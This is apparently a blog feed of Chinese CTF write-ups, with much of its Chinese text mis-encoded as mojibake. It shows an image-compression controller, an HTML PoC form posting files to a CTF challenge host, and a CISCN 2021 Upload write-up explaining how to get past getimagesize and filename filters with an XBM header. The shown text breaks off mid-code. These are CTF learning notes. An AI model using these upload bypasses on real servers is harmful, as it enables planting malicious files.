pvlease'</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token operator">-</span><span class="token operator">></span><span class="token function">withErrors</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$image_name</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'.png'</span><span class="token punctuation">;</span>            <span class="token variable">$dst_img</span> <span class="token operator">=</span> <span class="token string">'/var/www/html/'</span> <span class="token punctuation">.</span> <span class="token variable">$image_name</span><span class="token punctuation">;</span>            <span class="token variable">$percent</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">imgcompress</span><span class="token punctuation">(</span><span class="token variable">$source</span><span class="token punctuation">,</span> <span class="token variable">$percent</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">compressImg</span><span class="token punctuation">(</span><span class="token variable">$dst_img</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">with</span><span class="token punctuation">(</span><span class="token string">'image_name'</span><span class="token punctuation">,</span> <span class="token variable">$image_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h5 id="app-Http-Controllers-imgcompress-php"><a href="#app-Http-Controllers-imgcompress-php" class="headerlink" title="app/Http/Controllers/imgcompress.php"></a>app/Http/Controllers/imgcompress.php</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">App<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Controllers</span><span class="token punctuation">;</span>   <span class="token keyword">class</span> <span class="token class-name">imgcompress</span>   <span class="token punctuation">{</span>   <span class="token keyword">private</span> <span class="token variable">$src</span><span class="token punctuation">;</span>   <span class="token keyword">private</span> <span class="token variable">$image</span><span class="token punctuation">;</span>   <span class="token keyword">private</span> <span class="token variable">$imageinfo</span><span class="token punctuation">;</span>   <span class="token keyword">private</span> <span class="token variable">$percent</span> <span class="token operator">=</span> <span class="token number">0.5</span><span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$src</span><span class="token punctuation">,</span> <span class="token variable">$percent</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>      <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">src</span> <span class="token operator">=</span> <span class="token variable">$src</span><span class="token punctuation">;</span>      <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">percent</span> <span class="token operator">=</span> <span class="token variable">$percent</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">compressImg</span><span class="token punctuation">(</span><span class="token variable">$saveName</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>      <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_openImage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_saveImage</span><span class="token punctuation">(</span><span class="token variable">$saveName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">_openImage</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>      <span class="token function">list</span><span class="token punctuation">(</span><span class="token variable">$width</span><span class="token punctuation">,</span> <span class="token variable">$height</span><span class="token punctuation">,</span> <span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token variable">$attr</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">src</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">imageinfo</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>          <span class="token string">'width'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$width</span><span class="token punctuation">,</span>          <span class="token string">'height'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$height</span><span class="token punctuation">,</span>          <span class="token string">'type'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">image_type_to_extension</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">,</span>          <span class="token string">'attr'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$attr</span>      <span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token variable">$fun</span> <span class="token operator">=</span> <span class="token string">"imagecreatefrom"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">imageinfo</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">image</span> <span class="token operator">=</span> <span class="token variable">$fun</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">src</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_thumpImage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">_thumpImage</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>      <span class="token variable">$new_width</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">imageinfo</span><span class="token punctuation">[</span><span class="token string">'width'</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">percent</span><span class="token punctuation">;</span>      <span class="token variable">$new_height</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">imageinfo</span><span class="token punctuation">[</span><span class="token string">'height'</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">percent</span><span class="token punctuation">;</span>      <span class="token variable">$image_thump</span> <span class="token operator">=</span> <span class="token function">imagecreatetruecolor</span><span class="token punctuation">(</span><span class="token variable">$new_width</span><span class="token punctuation">,</span> <span class="token variable">$new_height</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//å°†åŽŸå›¾å¤åˆ¶å¸¦å›¾ç‰‡è½½ä½“ä¸Šé¢ï¼Œå¹¶ä¸”æŒ‰ç…§ä¸€å®šæ¯”ä¾‹åŽ‹ç¼©,æžå¤§çš„ä¿æŒäº†æ¸…æ™°åº¦</span>      <span class="token function">imagecopyresampled</span><span class="token punctuation">(</span><span class="token variable">$image_thump</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">image</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$new_width</span><span class="token punctuation">,</span> <span class="token variable">$new_height</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">imageinfo</span><span class="token punctuation">[</span><span class="token string">'width'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">imageinfo</span><span class="token punctuation">[</span><span class="token string">'height'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">imagedestroy</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">image</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">image</span> <span class="token operator">=</span> <span class="token variable">$image_thump</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">_saveImage</span><span class="token punctuation">(</span><span class="token variable">$dstImgName</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$dstImgName</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>      <span class="token variable">$allowImgs</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'.jpg'</span><span class="token punctuation">,</span> <span class="token string">'.jpeg'</span><span class="token punctuation">,</span> <span class="token string">'.png'</span><span class="token punctuation">,</span> <span class="token string">'.bmp'</span><span class="token punctuation">,</span> <span class="token string">'.wbmp'</span><span class="token punctuation">,</span> <span class="token string">'.gif'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//å¦‚æžœç›®æ ‡å›¾ç‰‡åæœ‰åŽç¼€å°±ç”¨ç›®æ ‡å›¾ç‰‡æ‰©å±•å åŽç¼€ï¼Œå¦‚æžœæ²¡æœ‰ï¼Œåˆ™ç”¨æºå›¾çš„æ‰©å±•å</span>      <span class="token variable">$dstExt</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$dstImgName</span><span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token variable">$sourseExt</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">src</span><span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$dstExt</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$dstExt</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$dstExt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$sourseExt</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$sourseExt</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$sourseExt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//æœ‰æŒ‡å®šç›®æ ‡åæ‰©å±•å</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$dstExt</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$dstExt</span><span class="token punctuation">,</span> <span class="token variable">$allowImgs</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token variable">$dstName</span> <span class="token operator">=</span> <span class="token variable">$dstImgName</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$sourseExt</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$sourseExt</span><span class="token punctuation">,</span> <span class="token variable">$allowImgs</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token variable">$dstName</span> <span class="token operator">=</span> <span class="token variable">$dstImgName</span> <span class="token punctuation">.</span> <span class="token variable">$sourseExt</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>          <span class="token variable">$dstName</span> <span class="token operator">=</span> <span class="token variable">$dstImgName</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">imageinfo</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token variable">$funcs</span> <span class="token operator">=</span> <span class="token string">"image"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">imageinfo</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token variable">$funcs</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">image</span><span class="token punctuation">,</span> <span class="token variable">$dstName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>      <span class="token function">imagedestroy</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">image</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token punctuation">}</span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>postä¸Šä¼ çš„ç½‘é¡µæºç </title>
      <link href="2021/09/07/post-shang-chuan-de-wang-ye-yuan-ma/"/>
      <url>2021/09/07/post-shang-chuan-de-wang-ye-yuan-ma/</url>
      
        <content type="html"><![CDATA[<pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span><span class="token constant">POST</span>æ•°æ®åŒ…<span class="token constant">POC</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://faebbc7b-35b5-4792-8b8a-9af1ec7fc48f.node3.buuoj.cn/upload.php?ctf<span class="token punctuation">=</span>upload<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!--é“¾æŽ¥æ˜¯å½“å‰æ‰“å¼€çš„é¢˜ç›®é“¾æŽ¥--></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>æ–‡ä»¶åï¼š<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>postedFile<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>postedFile<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>æäº¤<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CISCNï¼š2021-Upload</title>
      <link href="2021/09/06/ciscn-2021-upload/"/>
      <url>2021/09/06/ciscn-2021-upload/</url>
      
        <content type="html"><![CDATA[<h5 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token operator">==</span><span class="token string">"upload"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'postedFile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'size'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">1024</span><span class="token operator">*</span><span class="token number">512</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"è¿™ä¹ˆå¤§ä¸ªçš„ä¸œè¥¿ä½ æ˜¯æƒ³dæˆ‘å—ï¼Ÿ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$imageinfo</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'postedFile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$imageinfo</span> <span class="token operator">===</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"å¦‚æžœä¸èƒ½å¥½å¥½ä¼ å›¾ç‰‡çš„è¯å°±è¿˜æ˜¯ä¸è¦æ¥æ‰“æ‰°æˆ‘äº†"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$imageinfo</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$imageinfo</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"ä¸œè¥¿ä¸èƒ½æ–¹æ–¹æ­£æ­£çš„è¯å°±å¾ˆè®¨åŽŒ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$fileName</span><span class="token operator">=</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'postedFile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token string">"c"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token string">"i"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token string">"h"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token string">"ph"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"æœ‰äº›ä¸œè¥¿è®©ä½ ä¼ ä¸ŠåŽ»çš„è¯é‚£å¯ä¸å¾—äº†"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$imagePath</span> <span class="token operator">=</span> <span class="token string">"image/"</span> <span class="token punctuation">.</span> <span class="token function">mb_strtolower</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"postedFile"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$imagePath</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"upload success, image at $imagePath"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"ä¼ éƒ½æ²¡æœ‰ä¼ ä¸ŠåŽ»"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>$_FILESè¿™ä¸ªç»ç”± HTTP POST æ–‡ä»¶ä¸Šä¼ è€Œæäº¤è‡³è„šæœ¬çš„å˜é‡ã€‚ç±»ä¼¼äºŽæ—§æ•°ç»„ $HTTP_POST_FILES æ•°ç»„ã€‚</p><pre><code>$_FILESæ•°ç»„å†…å®¹å¦‚ä¸‹:&lt;input type="file" name="userfile"&gt;$_FILES['userfile']['name']å®¢æˆ·ç«¯æœºå™¨æ–‡ä»¶çš„åŽŸåç§°ã€‚$_FILES['userfile']['type'] æ–‡ä»¶çš„ MIME ç±»åž‹ï¼Œéœ€è¦æµè§ˆå™¨æä¾›è¯¥ä¿¡æ¯çš„æ”¯æŒï¼Œä¾‹å¦‚â€œimage/gifâ€ã€‚$_FILES['userfile']['size'] å·²ä¸Šä¼ æ–‡ä»¶çš„å¤§å°ï¼Œå•ä½ä¸ºå­—èŠ‚ã€‚$_FILES['userfile']['tmp_name'] æ–‡ä»¶è¢«ä¸Šä¼ åŽåœ¨æœåŠ¡ç«¯å‚¨å­˜çš„ä¸´æ—¶æ–‡ä»¶åã€‚$_FILES['userfile']['error'] å’Œè¯¥æ–‡ä»¶ä¸Šä¼ ç›¸å…³çš„é”™è¯¯ä»£ç ã€‚['error'] æ˜¯åœ¨ PHP 4.2.0 ç‰ˆæœ¬ä¸­å¢žåŠ çš„ã€‚æ³¨: åœ¨ PHP 4.1.0 ç‰ˆæœ¬ä»¥å‰è¯¥æ•°ç»„çš„åç§°ä¸º $HTTP_POST_FILESï¼Œå®ƒå¹¶ä¸åƒ $_FILES ä¸€æ ·æ˜¯è‡ªåŠ¨å…¨å±€å˜é‡ã€‚PHP 3 ä¸æ”¯æŒ $HTTP_POST_FILE</code></pre><ol><li>ä¸Šä¼ éœ€è¦ç»•è¿‡<code>getimagesize</code>ã€‚</li><li>å›¾ç‰‡çš„é•¿å®½å¿…é¡»ä¸º1.</li><li>æ–‡ä»¶åä¸èƒ½æœ‰cã€iã€h</li></ol><p>ç»•è¿‡<code>getimagesize</code>æ¯”è¾ƒç®€å•ä½¿ç”¨XMBå¤´å°±è¡Œäº†</p><pre><code>#define test_width 1#define test_height 1</code></pre><h5 id="example-php"><a href="#example-php" class="headerlink" title="example.php"></a>example.php</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token operator">==</span><span class="token string">"poc"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$zip</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$name_for_zip</span> <span class="token operator">=</span> <span class="token string">"example/"</span> <span class="token punctuation">.</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token 